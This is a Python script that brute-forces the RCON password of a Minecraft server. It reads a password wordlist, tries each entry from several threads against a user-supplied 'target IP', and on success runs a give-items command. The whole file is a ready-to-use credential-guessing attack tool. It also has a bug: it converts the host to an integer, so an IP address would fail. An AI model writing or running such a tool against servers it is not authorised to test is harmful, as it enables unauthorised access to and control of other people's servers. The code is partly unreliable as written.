from mcrcon import MCRcon
import threading
from queue import Queue

class RCONPasswordTrier:
    def __init__(self, host, port, password_file, command, max_threads):
        self.host = host
        self.port = port
        self.password_file = password_file
        self.command = command
        self.max_threads = max_threads
        self.password_queue = Queue()
        self.lock = threading.Lock()

        # Load passwords into the queue
        with open(password_file, 'r') as file:
            for password in file:
                self.password_queue.put(password.strip())

    def try_password(self):
        while not self.password_queue.empty():
            password = self.password_queue.get()
            try:
                with MCRcon(self.host, password, self.port) as mcr:
                    response = mcr.command(self.command)
                    with self.lock:
                        print(f"Password '{password}' is correct. Server Response: {response}")
                    return  # Stop trying passwords once one works
            except Exception as e:
                with self.lock:
                    print(f"Password '{password}' failed: {e}")

    def start(self):
        threads = []
        for _ in range(self.max_threads):
            thread = threading.Thread(target=self.try_password)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

# Example usage
if __name__ == "__main__":
    host = int(input("Enter target IP: "))  # Replace with your server's IP or hostname
    port = int(input("Input RCON port (default is 25575): "))  # Default RCON port for Minecraft servers
    password_file = str(input("Input path to password list: ")) # File containing a list of passwords (one per line)
    command = "/give @a minecraft:diamond 64"  # Command to send
    max_threads = int(input("Input max threads: ")) # Maximum number of concurrent threads
   
    trier = RCONPasswordTrier(host, port, password_file, command, max_threads)
    trier.start()